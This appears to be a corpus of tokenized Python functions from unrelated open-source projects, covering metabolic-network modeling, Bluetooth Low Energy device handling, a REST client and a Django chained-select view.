def read_timeout_value_header ( timeoutvalue ) : timeoutsecs = 0 timeoutvaluelist = timeoutvalue . split ( "," ) for timeoutspec in timeoutvaluelist : timeoutspec = timeoutspec . strip ( ) if timeoutspec . lower ( ) == "infinite" : return - 1 else : listSR = reSecondsReader . findall ( timeoutspec ) for secs in listSR : timeoutsecs = int ( secs ) if timeoutsecs > MAX_FINITE_TIMEOUT_LIMIT : return - 1 if timeoutsecs != 0 : return timeoutsecs return None
def _generate_index ( self ) : self . _dict = { v . id : k for k , v in enumerate ( self ) }
def _replace_on_id ( self , new_object ) : the_id = new_object . id the_index = self . _dict [ the_id ] list . __setitem__ ( self , the_index , new_object )
def append ( self , object ) : the_id = object . id self . _check ( the_id ) self . _dict [ the_id ] = len ( self ) list . append ( self , object )
def union ( self , iterable ) : _dict = self . _dict append = self . append for i in iterable : if i . id not in _dict : append ( i )
def extend ( self , iterable ) : # Sometimes during initialization from an older pickle, _dict # will not have initialized yet, because the initialization class was # left unspecified. This is an issue because unpickling calls # DictList.extend, which requires the presence of _dict. Therefore, # the issue is caught and addressed here. if not hasattr ( self , "_dict" ) or self . _dict is None : self . _dict = { } _dict = self . _dict current_length = len ( self ) list . extend ( self , iterable ) for i , obj in enumerate ( islice ( self , current_length , None ) , current_length ) : the_id = obj . id if the_id not in _dict : _dict [ the_id ] = i else : # undo the extend and raise an error self = self [ : current_length ] self . _check ( the_id ) # if the above succeeded, then the id must be present # twice in the list being added raise ValueError ( "id '%s' at index %d is non-unique. " "Is it present twice?" % ( str ( the_id ) , i ) )
def insert ( self , index , object ) : self . _check ( object . id ) list . insert ( self , index , object ) # all subsequent entries now have been shifted up by 1 _dict = self . _dict for i , j in iteritems ( _dict ) : if j >= index : _dict [ i ] = j + 1 _dict [ object . id ] = index
def check_solver_status ( status , raise_error = False ) : if status == OPTIMAL : return elif ( status in has_primals ) and not raise_error : warn ( "solver status is '{}'" . format ( status ) , UserWarning ) elif status is None : raise OptimizationError ( "model was not optimized yet or solver context switched" ) else : raise OptimizationError ( "solver status is '{}'" . format ( status ) )
def step ( sampler , x , delta , fraction = None , tries = 0 ) : prob = sampler . problem valid = ( ( np . abs ( delta ) > sampler . feasibility_tol ) & np . logical_not ( prob . variable_fixed ) ) # permissible alphas for staying in variable bounds valphas = ( ( 1.0 - sampler . bounds_tol ) * prob . variable_bounds - x ) [ : , valid ] valphas = ( valphas / delta [ valid ] ) . flatten ( ) if prob . bounds . shape [ 0 ] > 0 : # permissible alphas for staying in constraint bounds ineqs = prob . inequalities . dot ( delta ) valid = np . abs ( ineqs ) > sampler . feasibility_tol balphas = ( ( 1.0 - sampler . bounds_tol ) * prob . bounds - prob . inequalities . dot ( x ) ) [ : , valid ] balphas = ( balphas / ineqs [ valid ] ) . flatten ( ) # combined alphas alphas = np . hstack ( [ valphas , balphas ] ) else : alphas = valphas pos_alphas = alphas [ alphas > 0.0 ] neg_alphas = alphas [ alphas <= 0.0 ] alpha_range = np . array ( [ neg_alphas . max ( ) if len ( neg_alphas ) > 0 else 0 , pos_alphas . min ( ) if len ( pos_alphas ) > 0 else 0 ] ) if fraction : alpha = alpha_range [ 0 ] + fraction * ( alpha_range [ 1 ] - alpha_range [ 0 ] ) else : alpha = np . random . uniform ( alpha_range [ 0 ] , alpha_range [ 1 ] ) p = x + alpha * delta # Numerical instabilities may cause bounds invalidation # reset sampler and sample from one of the original warmup directions # if that occurs. Also reset if we got stuck. if ( np . any ( sampler . _bounds_dist ( p ) < - sampler . bounds_tol ) or np . abs ( np . abs ( alpha_range ) . max ( ) * delta ) . max ( ) < sampler . bounds_tol ) : if tries > MAX_TRIES : raise RuntimeError ( "Can not escape sampling region, model seems" " numerically unstable :( Reporting the " "model to " "will help us to fix this :)" ) LOGGER . info ( "found bounds infeasibility in sample, " "resetting to center" ) newdir = sampler . warmup [ np . random . randint ( sampler . n_warmup ) ] sampler . retries += 1 return step ( sampler , sampler . center , newdir - sampler . center , None , tries + 1 ) return p
def __build_problem ( self ) : # Set up the mathematical problem prob = constraint_matrices ( self . model , zero_tol = self . feasibility_tol ) # check if there any non-zero equality constraints equalities = prob . equalities b = prob . b bounds = np . atleast_2d ( prob . bounds ) . T var_bounds = np . atleast_2d ( prob . variable_bounds ) . T homogeneous = all ( np . abs ( b ) < self . feasibility_tol ) fixed_non_zero = np . abs ( prob . variable_bounds [ : , 1 ] ) > self . feasibility_tol fixed_non_zero &= prob . variable_fixed # check if there are any non-zero fixed variables, add them as # equalities to the stoichiometric matrix if any ( fixed_non_zero ) : n_fixed = fixed_non_zero . sum ( ) rows = np . zeros ( ( n_fixed , prob . equalities . shape [ 1 ] ) ) rows [ range ( n_fixed ) , np . where ( fixed_non_zero ) ] = 1.0 equalities = np . vstack ( [ equalities , rows ] ) var_b = prob . variable_bounds [ : , 1 ] b = np . hstack ( [ b , var_b [ fixed_non_zero ] ] ) homogeneous = False # Set up a projection that can cast point into the nullspace nulls = nullspace ( equalities ) # convert bounds to a matrix and add variable bounds as well return Problem ( equalities = shared_np_array ( equalities . shape , equalities ) , b = shared_np_array ( b . shape , b ) , inequalities = shared_np_array ( prob . inequalities . shape , prob . inequalities ) , bounds = shared_np_array ( bounds . shape , bounds ) , variable_fixed = shared_np_array ( prob . variable_fixed . shape , prob . variable_fixed , integer = True ) , variable_bounds = shared_np_array ( var_bounds . shape , var_bounds ) , nullspace = shared_np_array ( nulls . shape , nulls ) , homogeneous = homogeneous )
def _random_point ( self ) : idx = np . random . randint ( self . n_warmup , size = min ( 2 , np . ceil ( np . sqrt ( self . n_warmup ) ) ) ) return self . warmup [ idx , : ] . mean ( axis = 0 )
def _is_redundant ( self , matrix , cutoff = None ) : cutoff = 1.0 - self . feasibility_tol # Avoid zero variances extra_col = matrix [ : , 0 ] + 1 # Avoid zero rows being correlated with constant rows extra_col [ matrix . sum ( axis = 1 ) == 0 ] = 2 corr = np . corrcoef ( np . c_ [ matrix , extra_col ] ) corr = np . tril ( corr , - 1 ) return ( np . abs ( corr ) > cutoff ) . any ( axis = 1 )
def _bounds_dist ( self , p ) : prob = self . problem lb_dist = ( p - prob . variable_bounds [ 0 , ] ) . min ( ) ub_dist = ( prob . variable_bounds [ 1 , ] - p ) . min ( ) if prob . bounds . shape [ 0 ] > 0 : const = prob . inequalities . dot ( p ) const_lb_dist = ( const - prob . bounds [ 0 , ] ) . min ( ) const_ub_dist = ( prob . bounds [ 1 , ] - const ) . min ( ) lb_dist = min ( lb_dist , const_lb_dist ) ub_dist = min ( ub_dist , const_ub_dist ) return np . array ( [ lb_dist , ub_dist ] )
def add_switches_and_objective ( self ) : constraints = list ( ) big_m = max ( max ( abs ( b ) for b in r . bounds ) for r in self . model . reactions ) prob = self . model . problem for rxn in self . model . reactions : if not hasattr ( rxn , 'gapfilling_type' ) : continue indicator = prob . Variable ( name = 'indicator_{}' . format ( rxn . id ) , lb = 0 , ub = 1 , type = 'binary' ) if rxn . id in self . penalties : indicator . cost = self . penalties [ rxn . id ] else : indicator . cost = self . penalties [ rxn . gapfilling_type ] indicator . rxn_id = rxn . id self . indicators . append ( indicator ) # if z = 1 v_i is allowed non-zero # v_i - Mz <= 0   and   v_i + Mz >= 0 constraint_lb = prob . Constraint ( rxn . flux_expression - big_m * indicator , ub = 0 , name = 'constraint_lb_{}' . format ( rxn . id ) , sloppy = True ) constraint_ub = prob . Constraint ( rxn . flux_expression + big_m * indicator , lb = 0 , name = 'constraint_ub_{}' . format ( rxn . id ) , sloppy = True ) constraints . extend ( [ constraint_lb , constraint_ub ] ) self . model . add_cons_vars ( self . indicators ) self . model . add_cons_vars ( constraints , sloppy = True ) self . model . objective = prob . Objective ( Zero , direction = 'min' , sloppy = True ) self . model . objective . set_linear_coefficients ( { i : 1 for i in self . indicators } ) self . update_costs ( )
def normalize_cutoff ( model , zero_cutoff = None ) : if zero_cutoff is None : return model . tolerance else : if zero_cutoff < model . tolerance : raise ValueError ( "The chosen zero cutoff cannot be less than the model's " "tolerance value." ) else : return zero_cutoff
def _fix_type ( value ) : # Because numpy floats can not be pickled to json if isinstance ( value , string_types ) : return str ( value ) if isinstance ( value , float_ ) : return float ( value ) if isinstance ( value , bool_ ) : return bool ( value ) if isinstance ( value , set ) : return list ( value ) if isinstance ( value , dict ) : return OrderedDict ( ( key , value [ key ] ) for key in sorted ( value ) ) # handle legacy Formula type if value . __class__ . __name__ == "Formula" : return str ( value ) if value is None : return "" return value
def _update_optional ( cobra_object , new_dict , optional_attribute_dict , ordered_keys ) : for key in ordered_keys : default = optional_attribute_dict [ key ] value = getattr ( cobra_object , key ) if value is None or value == default : continue new_dict [ key ] = _fix_type ( value )
def _get_id_compartment ( id ) : bracket_search = _bracket_re . findall ( id ) if len ( bracket_search ) == 1 : return bracket_search [ 0 ] [ 1 ] underscore_search = _underscore_re . findall ( id ) if len ( underscore_search ) == 1 : return underscore_search [ 0 ] [ 1 ] return None
def _cell ( x ) : x_no_none = [ i if i is not None else "" for i in x ] return array ( x_no_none , dtype = np_object )
def create_mat_dict ( model ) : rxns = model . reactions mets = model . metabolites mat = OrderedDict ( ) mat [ "mets" ] = _cell ( [ met_id for met_id in create_mat_metabolite_id ( model ) ] ) mat [ "metNames" ] = _cell ( mets . list_attr ( "name" ) ) mat [ "metFormulas" ] = _cell ( [ str ( m . formula ) for m in mets ] ) try : mat [ "metCharge" ] = array ( mets . list_attr ( "charge" ) ) * 1. except TypeError : # can't have any None entries for charge, or this will fail pass mat [ "genes" ] = _cell ( model . genes . list_attr ( "id" ) ) # make a matrix for rxnGeneMat # reactions are rows, genes are columns rxn_gene = scipy_sparse . dok_matrix ( ( len ( model . reactions ) , len ( model . genes ) ) ) if min ( rxn_gene . shape ) > 0 : for i , reaction in enumerate ( model . reactions ) : for gene in reaction . genes : rxn_gene [ i , model . genes . index ( gene ) ] = 1 mat [ "rxnGeneMat" ] = rxn_gene mat [ "grRules" ] = _cell ( rxns . list_attr ( "gene_reaction_rule" ) ) mat [ "rxns" ] = _cell ( rxns . list_attr ( "id" ) ) mat [ "rxnNames" ] = _cell ( rxns . list_attr ( "name" ) ) mat [ "subSystems" ] = _cell ( rxns . list_attr ( "subsystem" ) ) stoich_mat = create_stoichiometric_matrix ( model ) mat [ "S" ] = stoich_mat if stoich_mat is not None else [ [ ] ] # multiply by 1 to convert to float, working around scipy bug mat [ "lb" ] = array ( rxns . list_attr ( "lower_bound" ) ) * 1. mat [ "ub" ] = array ( rxns . list_attr ( "upper_bound" ) ) * 1. mat [ "b" ] = array ( mets . list_attr ( "_bound" ) ) * 1. mat [ "c" ] = array ( rxns . list_attr ( "objective_coefficient" ) ) * 1. mat [ "rev" ] = array ( rxns . list_attr ( "reversibility" ) ) * 1 mat [ "description" ] = str ( model . id ) return mat
def get_context ( obj ) : try : return obj . _contexts [ - 1 ] except ( AttributeError , IndexError ) : pass try : return obj . _model . _contexts [ - 1 ] except ( AttributeError , IndexError ) : pass return None
def get_metabolite_compartments ( self ) : warn ( 'use Model.compartments instead' , DeprecationWarning ) return { met . compartment for met in self . metabolites if met . compartment is not None }
def _escape_str_id ( id_str ) : for c in ( "'" , '"' ) : if id_str . startswith ( c ) and id_str . endswith ( c ) and id_str . count ( c ) == 2 : id_str = id_str . strip ( c ) for char , escaped_char in _renames : id_str = id_str . replace ( char , escaped_char ) return id_str
def escape_ID ( cobra_model ) : for x in chain ( [ cobra_model ] , cobra_model . metabolites , cobra_model . reactions , cobra_model . genes ) : x . id = _escape_str_id ( x . id ) cobra_model . repair ( ) gene_renamer = _GeneEscaper ( ) for rxn , rule in iteritems ( get_compiled_gene_reaction_rules ( cobra_model ) ) : if rule is not None : rxn . _gene_reaction_rule = ast2str ( gene_renamer . visit ( rule ) )
def rename_genes ( cobra_model , rename_dict ) : recompute_reactions = set ( ) # need to recomptue related genes remove_genes = [ ] for old_name , new_name in iteritems ( rename_dict ) : # undefined if there a value matches a different key # because dict is unordered try : gene_index = cobra_model . genes . index ( old_name ) except ValueError : gene_index = None old_gene_present = gene_index is not None new_gene_present = new_name in cobra_model . genes if old_gene_present and new_gene_present : old_gene = cobra_model . genes . get_by_id ( old_name ) # Added in case not renaming some genes: if old_gene is not cobra_model . genes . get_by_id ( new_name ) : remove_genes . append ( old_gene ) recompute_reactions . update ( old_gene . _reaction ) elif old_gene_present and not new_gene_present : # rename old gene to new gene gene = cobra_model . genes [ gene_index ] # trick DictList into updating index cobra_model . genes . _dict . pop ( gene . id ) # ugh gene . id = new_name cobra_model . genes [ gene_index ] = gene elif not old_gene_present and new_gene_present : pass else : # if not old gene_present and not new_gene_present # the new gene's _model will be set by repair # This would add genes from rename_dict # that are not associated with a rxn # cobra_model.genes.append(Gene(new_name)) pass cobra_model . repair ( ) class Renamer ( NodeTransformer ) : def visit_Name ( self , node ) : node . id = rename_dict . get ( node . id , node . id ) return node gene_renamer = Renamer ( ) for rxn , rule in iteritems ( get_compiled_gene_reaction_rules ( cobra_model ) ) : if rule is not None : rxn . _gene_reaction_rule = ast2str ( gene_renamer . visit ( rule ) ) for rxn in recompute_reactions : rxn . gene_reaction_rule = rxn . _gene_reaction_rule for i in remove_genes : cobra_model . genes . remove ( i )
def _init_worker ( model , loopless , sense ) : global _model global _loopless _model = model _model . solver . objective . direction = sense _loopless = loopless
def find_bump ( target , tag ) : tmp = tag . split ( "." ) existing = [ intify ( basename ( f ) ) for f in glob ( join ( target , "[0-9]*.md" ) ) ] latest = max ( existing ) if int ( tmp [ 0 ] ) > latest [ 0 ] : return "major" elif int ( tmp [ 1 ] ) > latest [ 1 ] : return "minor" else : return "patch"
def reverse_id ( self ) : return '_' . join ( ( self . id , 'reverse' , hashlib . md5 ( self . id . encode ( 'utf-8' ) ) . hexdigest ( ) [ 0 : 5 ] ) )
def build_reaction_string ( self , use_metabolite_names = False ) : def format ( number ) : return "" if number == 1 else str ( number ) . rstrip ( "." ) + " " id_type = 'id' if use_metabolite_names : id_type = 'name' reactant_bits = [ ] product_bits = [ ] for met in sorted ( self . _metabolites , key = attrgetter ( "id" ) ) : coefficient = self . _metabolites [ met ] name = str ( getattr ( met , id_type ) ) if coefficient >= 0 : product_bits . append ( format ( coefficient ) + name ) else : reactant_bits . append ( format ( abs ( coefficient ) ) + name ) reaction_string = ' + ' . join ( reactant_bits ) if not self . reversibility : if self . lower_bound < 0 and self . upper_bound <= 0 : reaction_string += ' <-- ' else : reaction_string += ' --> ' else : reaction_string += ' <=> ' reaction_string += ' + ' . join ( product_bits ) return reaction_string
def compartments ( self ) : if self . _compartments is None : self . _compartments = { met . compartment for met in self . _metabolites if met . compartment is not None } return self . _compartments
def _clip ( sid , prefix ) : return sid [ len ( prefix ) : ] if sid . startswith ( prefix ) else sid
def _f_gene ( sid , prefix = "G_" ) : sid = sid . replace ( SBML_DOT , "." ) return _clip ( sid , prefix )
def _create_parameter ( model , pid , value , sbo = None , constant = True , units = None , flux_udef = None ) : parameter = model . createParameter ( ) # type: libsbml.Parameter parameter . setId ( pid ) parameter . setValue ( value ) parameter . setConstant ( constant ) if sbo : parameter . setSBOTerm ( sbo ) if units : parameter . setUnits ( flux_udef . getId ( ) )
def reaction_weight ( reaction ) : if len ( reaction . metabolites ) != 1 : raise ValueError ( 'Reaction weight is only defined for single ' 'metabolite products or educts.' ) met , coeff = next ( iteritems ( reaction . metabolites ) ) return [ coeff * met . formula_weight ]
def _add_cycle_free ( model , fluxes ) : model . objective = model . solver . interface . Objective ( Zero , direction = "min" , sloppy = True ) objective_vars = [ ] for rxn in model . reactions : flux = fluxes [ rxn . id ] if rxn . boundary : rxn . bounds = ( flux , flux ) continue if flux >= 0 : rxn . bounds = max ( 0 , rxn . lower_bound ) , max ( flux , rxn . upper_bound ) objective_vars . append ( rxn . forward_variable ) else : rxn . bounds = min ( flux , rxn . lower_bound ) , min ( 0 , rxn . upper_bound ) objective_vars . append ( rxn . reverse_variable ) model . objective . set_linear_coefficients ( { v : 1.0 for v in objective_vars } )
def _hashable_bytes ( data ) : if isinstance ( data , bytes ) : return data elif isinstance ( data , str ) : return data . encode ( 'ascii' ) # Fail on anything non-ASCII. else : raise TypeError ( data )
def _update_advertised ( self , advertised ) : # Advertisement data was received, pull out advertised service UUIDs and # name from advertisement data. if 'kCBAdvDataServiceUUIDs' in advertised : self . _advertised = self . _advertised + map ( cbuuid_to_uuid , advertised [ 'kCBAdvDataServiceUUIDs' ] )
def _characteristics_discovered ( self , service ) : # Characteristics for the specified service were discovered.  Update # set of discovered services and signal when all have been discovered. self . _discovered_services . add ( service ) if self . _discovered_services >= set ( self . _peripheral . services ( ) ) : # Found all the services characteristics, finally time to fire the # service discovery complete event. self . _discovered . set ( )
def _characteristic_changed ( self , characteristic ) : # Called when a characteristic is changed.  Get the on_changed handler # for this characteristic (if it exists) and call it. on_changed = self . _char_on_changed . get ( characteristic , None ) if on_changed is not None : on_changed ( characteristic . value ( ) . bytes ( ) . tobytes ( ) ) # Also tell the characteristic that it has a new value. # First get the service that is associated with this characteristic. char = characteristic_list ( ) . get ( characteristic ) if char is not None : char . _value_read . set ( )
def _descriptor_changed ( self , descriptor ) : # Tell the descriptor it has a new value to read. desc = descriptor_list ( ) . get ( descriptor ) if desc is not None : desc . _value_read . set ( )
def rssi ( self , timeout_sec = TIMEOUT_SEC ) : # Kick off query to get RSSI, then wait for it to return asyncronously # when the _rssi_changed() function is called. self . _rssi_read . clear ( ) self . _peripheral . readRSSI ( ) if not self . _rssi_read . wait ( timeout_sec ) : raise RuntimeError ( 'Exceeded timeout waiting for RSSI value!' ) return self . _rssi
def _state_changed ( self , state ) : logger . debug ( 'Adapter state change: {0}' . format ( state ) ) # Handle when powered on. if state == 5 : self . _powered_off . clear ( ) self . _powered_on . set ( ) # Handle when powered off. elif state == 4 : self . _powered_on . clear ( ) self . _powered_off . set ( )
def start_scan ( self , timeout_sec = TIMEOUT_SEC ) : get_provider ( ) . _central_manager . scanForPeripheralsWithServices_options_ ( None , None ) self . _is_scanning = True
def stop_scan ( self , timeout_sec = TIMEOUT_SEC ) : get_provider ( ) . _central_manager . stopScan ( ) self . _is_scanning = False
def power_on ( self , timeout_sec = TIMEOUT_SEC ) : # Turn on bluetooth and wait for powered on event to be set. self . _powered_on . clear ( ) IOBluetoothPreferenceSetControllerPowerState ( 1 ) if not self . _powered_on . wait ( timeout_sec ) : raise RuntimeError ( 'Exceeded timeout waiting for adapter to power on!' )
def power_off ( self , timeout_sec = TIMEOUT_SEC ) : # Turn off bluetooth. self . _powered_off . clear ( ) IOBluetoothPreferenceSetControllerPowerState ( 0 ) if not self . _powered_off . wait ( timeout_sec ) : raise RuntimeError ( 'Exceeded timeout waiting for adapter to power off!' )
def read_value ( self , timeout_sec = TIMEOUT_SEC ) : # Kick off a query to read the value of the characteristic, then wait # for the result to return asyncronously. self . _value_read . clear ( ) self . _device . _peripheral . readValueForCharacteristic_ ( self . _characteristic ) if not self . _value_read . wait ( timeout_sec ) : raise RuntimeError ( 'Exceeded timeout waiting to read characteristic value!' ) return self . _characteristic . value ( )
def write_value ( self , value , write_type = 0 ) : data = NSData . dataWithBytes_length_ ( value , len ( value ) ) self . _device . _peripheral . writeValue_forCharacteristic_type_ ( data , self . _characteristic , write_type )
def read_value ( self ) : pass # Kick off a query to read the value of the descriptor, then wait # for the result to return asyncronously. self . _value_read . clear ( ) self . _device . _peripheral . readValueForDescriptor ( self . _descriptor ) if not self . _value_read . wait ( timeout_sec ) : raise RuntimeError ( 'Exceeded timeout waiting to read characteristic value!' ) return self . _value
def start_scan ( self , timeout_sec = TIMEOUT_SEC ) : self . _scan_started . clear ( ) self . _adapter . StartDiscovery ( ) if not self . _scan_started . wait ( timeout_sec ) : raise RuntimeError ( 'Exceeded timeout waiting for adapter to start scanning!' )
def stop_scan ( self , timeout_sec = TIMEOUT_SEC ) : self . _scan_stopped . clear ( ) self . _adapter . StopDiscovery ( ) if not self . _scan_stopped . wait ( timeout_sec ) : raise RuntimeError ( 'Exceeded timeout waiting for adapter to stop scanning!' )
def centralManager_didConnectPeripheral_ ( self , manager , peripheral ) : logger . debug ( 'centralManager_didConnectPeripheral called' ) # Setup peripheral delegate and kick off service discovery.  For now just # assume all services need to be discovered. peripheral . setDelegate_ ( self ) peripheral . discoverServices_ ( None ) # Fire connected event for device. device = device_list ( ) . get ( peripheral ) if device is not None : device . _set_connected ( )
def centralManager_didDisconnectPeripheral_error_ ( self , manager , peripheral , error ) : logger . debug ( 'centralManager_didDisconnectPeripheral called' ) # Get the device and remove it from the device list, then fire its # disconnected event. device = device_list ( ) . get ( peripheral ) if device is not None : # Fire disconnected event and remove device from device list. device . _set_disconnected ( ) device_list ( ) . remove ( peripheral )
def peripheral_didDiscoverServices_ ( self , peripheral , services ) : logger . debug ( 'peripheral_didDiscoverServices called' ) # Make sure the discovered services are added to the list of known # services, and kick off characteristic discovery for each one. # NOTE: For some reason the services parameter is never set to a good # value, instead you must query peripheral.services() to enumerate the # discovered services. for service in peripheral . services ( ) : if service_list ( ) . get ( service ) is None : service_list ( ) . add ( service , CoreBluetoothGattService ( service ) ) # Kick off characteristic discovery for this service.  Just discover # all characteristics for now. peripheral . discoverCharacteristics_forService_ ( None , service )
def peripheral_didDiscoverCharacteristicsForService_error_ ( self , peripheral , service , error ) : logger . debug ( 'peripheral_didDiscoverCharacteristicsForService_error called' ) # Stop if there was some kind of error. if error is not None : return # Make sure the discovered characteristics are added to the list of known # characteristics, and kick off descriptor discovery for each char. for char in service . characteristics ( ) : # Add to list of known characteristics. if characteristic_list ( ) . get ( char ) is None : characteristic_list ( ) . add ( char , CoreBluetoothGattCharacteristic ( char ) ) # Start descriptor discovery. peripheral . discoverDescriptorsForCharacteristic_ ( char ) # Notify the device about the discovered characteristics. device = device_list ( ) . get ( peripheral ) if device is not None : device . _characteristics_discovered ( service )
def peripheral_didDiscoverDescriptorsForCharacteristic_error_ ( self , peripheral , characteristic , error ) : logger . debug ( 'peripheral_didDiscoverDescriptorsForCharacteristic_error called' ) # Stop if there was some kind of error. if error is not None : return # Make sure the discovered descriptors are added to the list of known # descriptors. for desc in characteristic . descriptors ( ) : # Add to list of known descriptors. if descriptor_list ( ) . get ( desc ) is None : descriptor_list ( ) . add ( desc , CoreBluetoothGattDescriptor ( desc ) )
def peripheral_didUpdateValueForCharacteristic_error_ ( self , peripheral , characteristic , error ) : logger . debug ( 'peripheral_didUpdateValueForCharacteristic_error called' ) # Stop if there was some kind of error. if error is not None : return # Notify the device about the updated characteristic value. device = device_list ( ) . get ( peripheral ) if device is not None : device . _characteristic_changed ( characteristic )
def peripheral_didUpdateValueForDescriptor_error_ ( self , peripheral , descriptor , error ) : logger . debug ( 'peripheral_didUpdateValueForDescriptor_error called' ) # Stop if there was some kind of error. if error is not None : return # Notify the device about the updated descriptor value. device = device_list ( ) . get ( peripheral ) if device is not None : device . _descriptor_changed ( descriptor )
def peripheral_didReadRSSI_error_ ( self , peripheral , rssi , error ) : logger . debug ( 'peripheral_didReadRSSI_error called' ) # Note this appears to be completely undocumented at the time of this # writing.  Can see more details at: #  http://stackoverflow.com/questions/25952218/ios-8-corebluetooth-deprecated-rssi-methods # Stop if there was some kind of error. if error is not None : return # Notify the device about the updated RSSI value. device = device_list ( ) . get ( peripheral ) if device is not None : device . _rssi_changed ( rssi )
def _user_thread_main ( self , target ) : try : # Run user's code. return_code = target ( ) # Assume good result (0 return code) if none is returned. if return_code is None : return_code = 0 # Call exit on the main thread when user code has finished. AppHelper . callAfter ( lambda : sys . exit ( return_code ) ) except Exception as ex : # Something went wrong.  Raise the exception on the main thread to exit. AppHelper . callAfter ( self . _raise_error , sys . exc_info ( ) )
def _user_thread_main ( self , target ) : try : # Wait for GLib main loop to start running before starting user code. while True : if self . _gobject_mainloop is not None and self . _gobject_mainloop . is_running ( ) : # Main loop is running, we should be ready to make bluez DBus calls. break # Main loop isn't running yet, give time back to other threads. time . sleep ( 0 ) # Run user's code. self . _return_code = target ( ) # Assume good result (0 return code) if none is returned. if self . _return_code is None : self . _return_code = 0 # Signal the main loop to exit. self . _gobject_mainloop . quit ( ) except Exception as ex : # Something went wrong.  Raise the exception on the main thread to # exit. self . _exception = sys . exc_info ( ) self . _gobject_mainloop . quit ( )
def _get_objects_by_path ( self , paths ) : return map ( lambda x : self . _bus . get_object ( 'org.bluez' , x ) , paths )
def _print_tree ( self ) : # This is based on the bluez sample code get-managed-objects.py. objects = self . _bluez . GetManagedObjects ( ) for path in objects . keys ( ) : print ( "[ %s ]" % ( path ) ) interfaces = objects [ path ] for interface in interfaces . keys ( ) : if interface in [ "org.freedesktop.DBus.Introspectable" , "org.freedesktop.DBus.Properties" ] : continue print ( "    %s" % ( interface ) ) properties = interfaces [ interface ] for key in properties . keys ( ) : print ( "      %s = %s" % ( key , properties [ key ] ) )
def remove ( self , cbobject ) : with self . _lock : if cbobject in self . _metadata : del self . _metadata [ cbobject ]
def cbuuid_to_uuid ( cbuuid ) : data = cbuuid . data ( ) . bytes ( ) template = '{:0>8}-0000-1000-8000-00805f9b34fb' if len ( data ) <= 4 else '{:0>32}' value = template . format ( hexlify ( data . tobytes ( ) [ : 16 ] ) . decode ( 'ascii' ) ) return uuid . UUID ( hex = value )
def set_color ( self , r , g , b ) : # See more details on the bulb's protocol from this guide: #   https://learn.adafruit.com/reverse-engineering-a-bluetooth-low-energy-light-bulb/overview command = '\x58\x01\x03\x01\xFF\x00{0}{1}{2}' . format ( chr ( r & 0xFF ) , chr ( g & 0xFF ) , chr ( b & 0xFF ) ) self . _color . write_value ( command )
def get_provider ( ) : global _provider # Set the provider based on the current platform. if _provider is None : if sys . platform . startswith ( 'linux' ) : # Linux platform from . bluez_dbus . provider import BluezProvider _provider = BluezProvider ( ) elif sys . platform == 'darwin' : # Mac OSX platform from . corebluetooth . provider import CoreBluetoothProvider _provider = CoreBluetoothProvider ( ) else : # Unsupported platform raise RuntimeError ( 'Sorry the {0} platform is not supported by the BLE library!' . format ( sys . platform ) ) return _provider
def toBigInt ( byteArray ) : array = byteArray [ : : - 1 ] # reverse array out = 0 for key , value in enumerate ( array ) : decoded = struct . unpack ( "B" , bytes ( [ value ] ) ) [ 0 ] out = out | decoded << key * 8 return out
def get ( self , url , name , params = None , headers = None , connection = None ) : if name is None : name = '' params = params or { } headers = headers or { } endpoint = self . _build_endpoint_url ( url , name ) self . _authenticate ( params , headers ) return make_get_request ( endpoint , params , headers , connection = connection )
def get_async ( self , url , name , callback = None , params = None , headers = None ) : if name is None : name = '' params = params or { } headers = headers or { } endpoint = self . _build_endpoint_url ( url , name ) self . _authenticate ( params , headers ) process_pool . apply_async ( make_get_request , args = ( endpoint , params , headers ) , callback = callback )
def put_async ( self , url , name , data , callback = None , params = None , headers = None ) : if name is None : name = '' params = params or { } headers = headers or { } endpoint = self . _build_endpoint_url ( url , name ) self . _authenticate ( params , headers ) data = json . dumps ( data , cls = JSONEncoder ) process_pool . apply_async ( make_put_request , args = ( endpoint , data , params , headers ) , callback = callback )
def post ( self , url , data , params = None , headers = None , connection = None ) : params = params or { } headers = headers or { } endpoint = self . _build_endpoint_url ( url , None ) self . _authenticate ( params , headers ) data = json . dumps ( data , cls = JSONEncoder ) return make_post_request ( endpoint , data , params , headers , connection = connection )
def post_async ( self , url , data , callback = None , params = None , headers = None ) : params = params or { } headers = headers or { } endpoint = self . _build_endpoint_url ( url , None ) self . _authenticate ( params , headers ) data = json . dumps ( data , cls = JSONEncoder ) process_pool . apply_async ( make_post_request , args = ( endpoint , data , params , headers ) , callback = callback )
def patch ( self , url , data , params = None , headers = None , connection = None ) : params = params or { } headers = headers or { } endpoint = self . _build_endpoint_url ( url , None ) self . _authenticate ( params , headers ) data = json . dumps ( data , cls = JSONEncoder ) return make_patch_request ( endpoint , data , params , headers , connection = connection )
def delete ( self , url , name , params = None , headers = None , connection = None ) : if not name : name = '' params = params or { } headers = headers or { } endpoint = self . _build_endpoint_url ( url , name ) self . _authenticate ( params , headers ) return make_delete_request ( endpoint , params , headers , connection = connection )
def delete_async ( self , url , name , callback = None , params = None , headers = None ) : if not name : name = '' params = params or { } headers = headers or { } endpoint = self . _build_endpoint_url ( url , name ) self . _authenticate ( params , headers ) process_pool . apply_async ( make_delete_request , args = ( endpoint , params , headers ) , callback = callback )
def filterchain_all ( request , app , model , field , foreign_key_app_name , foreign_key_model_name , foreign_key_field_name , value ) : model_class = get_model ( app , model ) keywords = get_keywords ( field , value ) # SECURITY: Make sure all smart selects requests are opt-in foreign_model_class = get_model ( foreign_key_app_name , foreign_key_model_name ) if not any ( [ ( isinstance ( f , ChainedManyToManyField ) or isinstance ( f , ChainedForeignKey ) ) for f in foreign_model_class . _meta . get_fields ( ) ] ) : raise PermissionDenied ( "Smart select disallowed" ) # filter queryset using limit_choices_to limit_choices_to = get_limit_choices_to ( foreign_key_app_name , foreign_key_model_name , foreign_key_field_name ) queryset = get_queryset ( model_class , limit_choices_to = limit_choices_to ) filtered = list ( do_filter ( queryset , keywords ) ) # Sort results if model doesn't include a default ordering. if not getattr ( model_class . _meta , 'ordering' , False ) : sort_results ( list ( filtered ) ) excluded = list ( do_filter ( queryset , keywords , exclude = True ) ) # Sort results if model doesn't include a default ordering. if not getattr ( model_class . _meta , 'ordering' , False ) : sort_results ( list ( excluded ) ) # Empty choice to separate filtered and excluded results. empty_choice = { 'value' : "" , 'display' : "---------" } serialized_results = ( serialize_results ( filtered ) + [ empty_choice ] + serialize_results ( excluded ) ) return JsonResponse ( serialized_results , safe = False )
